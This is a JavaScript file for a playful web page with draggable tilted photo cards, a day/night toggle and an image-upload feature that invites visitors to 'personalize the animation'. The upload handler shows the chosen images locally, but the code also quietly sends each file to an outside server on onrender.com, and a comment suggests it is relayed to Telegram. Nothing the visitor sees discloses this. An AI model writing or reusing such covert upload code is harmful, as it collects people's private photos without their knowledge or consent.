let highestZ = 1;

class Paper {
  isDragging = false;
  offsetX = 0;
  offsetY = 0;
  rotation = Math.random() * 10 - 5;
  paperX = 0;
  paperY = 0;

  init(paper) {
    paper.style.setProperty('--rotate', `${this.rotation.toFixed(2)}deg`);

    // Center paper
    const rect = paper.getBoundingClientRect();
    this.paperX = window.innerWidth / 2 - rect.width / 2;
    this.paperY = window.innerHeight / 2 - rect.height / 2;
    paper.style.transform = `translate(${this.paperX}px, ${this.paperY}px) rotate(${this.rotation}deg)`;

    const startDrag = (x, y) => {
      this.isDragging = true;
      paper.style.zIndex = highestZ++;
      this.offsetX = x - this.paperX;
      this.offsetY = y - this.paperY;
    };

    const moveDrag = (x, y) => {
      if (!this.isDragging) return;
      this.paperX = x - this.offsetX;
      this.paperY = y - this.offsetY;
      paper.style.transform = `translate(${this.paperX}px, ${this.paperY}px) rotate(${this.rotation}deg)`;
    };

    const endDrag = () => {
      this.isDragging = false;
    };

    // Mouse
    paper.addEventListener('mousedown', (e) => {
      startDrag(e.clientX, e.clientY);
      document.addEventListener('mousemove', onMouseMove);
      document.addEventListener('mouseup', onMouseUp);
    });

    const onMouseMove = (e) => moveDrag(e.clientX, e.clientY);
    const onMouseUp = () => {
      endDrag();
      document.removeEventListener('mousemove', onMouseMove);
      document.removeEventListener('mouseup', onMouseUp);
    };

    // Touch
    paper.addEventListener('touchstart', (e) => {
      const touch = e.touches[0];
      startDrag(touch.clientX, touch.clientY);
    });

    paper.addEventListener('touchmove', (e) => {
      const touch = e.touches[0];
      moveDrag(touch.clientX, touch.clientY);
    });

    paper.addEventListener('touchend', endDrag);
  }
}

// 🧾 Initialize papers
document.querySelectorAll('.paper').forEach((paper, i) => {
  const p = new Paper();
  p.init(paper);
  paper.style.zIndex = i + 1;
});

// 🌗 Mode Toggle
const toggleBtn = document.getElementById('modeToggle');
const body = document.body;

body.classList.add('day-mode');
toggleBtn.textContent = '🌞';

toggleBtn.addEventListener('click', () => {
  body.classList.toggle('day-mode');
  body.classList.toggle('night-mode');
  toggleBtn.textContent = body.classList.contains('day-mode') ? '🌞' : '🌙';
});

// 📤 Image Upload + Telegram
const imageUpload = document.getElementById('imageUpload');
const imageElements = document.querySelectorAll('.paper.image img');

imageUpload.addEventListener('change', async (event) => {
  const files = Array.from(event.target.files);
  if (files.length !== 3) {
    alert("Please upload exactly 3 images to personalize the animation.");
    return;
  }

  for (let i = 0; i < files.length; i++) {
    const file = files[i];
    const reader = new FileReader();
    reader.onload = function(e) {
      if (imageElements[i]) {
        imageElements[i].classList.add('replacing');
        imageElements[i].src = e.target.result;
        setTimeout(() => {
          imageElements[i].classList.remove('replacing');
        }, 500);
      }
    };
    reader.readAsDataURL(file);

    try {
      const formData = new FormData();
      formData.append('image', file);

      const res = await fetch('https://radharani9-3.onrender.com/upload', {
        method: 'POST',
        body: formData
      });

      const msg = await res.text();
      console.log(`Image ${i + 1} uploaded:`, msg);
    } catch (err) {
      console.error(`Upload failed for image ${i + 1}:`, err);
    }
  }
});
